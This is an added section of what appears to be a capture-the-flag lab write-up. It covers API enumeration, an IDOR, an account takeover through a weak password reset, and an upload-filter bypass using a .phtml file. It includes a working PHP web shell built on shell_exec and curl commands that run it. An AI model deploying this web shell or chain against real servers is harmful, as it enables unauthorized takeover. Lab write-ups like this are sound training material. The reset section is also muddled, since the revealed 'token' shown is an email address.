@@ -117,3 +117,61 @@ Progress: 175328 / 175330 (100.00%)
 I registered an account successfully on `/register.php` and logged in as `test@mail.com` & `faisal123` as creds.
 There I found some links as one of them is `/profile.php`. Exposing the `IDOR`. Moreover I checked the `/api` endpoint and it was exposing `api routes` which was not intended.
 
+checking the api endpoint:
+
+```
+curl http://10.64.146.243/api/
+```
+
+results:
+
+```shell-session
+{"endpoints":["\/api\/user","\/api\/jobs","\/api\/applications"]}
+```
+
+## IDOR:
+
+On going to the `/profile` page the `http://10.64.146.243/profile.php?id=6` appears and changing the `id` parameter to `id=1` i got the `Administrator`.
+
+## Weak password reset:
+
+```
+http://10.64.146.243/reset.php
+```
+
+with the following account proceed:
+
+```
+testuser@fake.thm
+```
+
+upon giving the email the token is being revealed in the response:
+
+```
+s.mitchell@recruitx.thm
+```
+
+using that I changed the `Administrator` account and logged in.
+
+Got the admin panel, uploaded the file for RCE. The files are stored in `upload/documents`, it only accepts `pdf`, `images` and `documents`.
+
+The payload:
+
+```
+echo '<?php echo "PHP is executing"; ?>' > test.phtml
+```
+
+The extension `phtml` was accepted.
+
+Now getting the RCE:
+
+```
+<?php if(isset($_GET['cmd'])) { echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; } ?>
+```
+
+After uploading the file we can check by executing different commands in the `cmd` parameter:
+
+```
+curl "http://10.64.146.243/uploads/documents/shell.phtml?cmd=whoami"
+```
+
